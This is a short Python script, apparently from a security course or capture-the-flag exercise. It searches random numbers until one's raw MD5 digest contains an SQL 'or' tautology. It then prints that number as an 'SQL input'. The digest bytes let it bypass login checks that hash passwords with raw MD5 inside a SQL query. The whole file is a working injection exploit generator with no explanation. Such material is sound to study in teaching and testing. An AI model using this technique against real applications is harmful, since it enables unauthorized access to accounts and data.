#!/usr/bin/python3
import os, random, re, time
from pymd5 import md5, padding
srch_pattern=bytes("\A.*?'(\|\||or|Or|OR|oR)'[1-9]+?.*",'ascii')
while(True):

	teststr = ""
	teststr = str(random.randint(0, 100000000000000))
	match = re.search(srch_pattern, md5(teststr).digest())

	if match:
		print("SQL input:\t", teststr)
		break



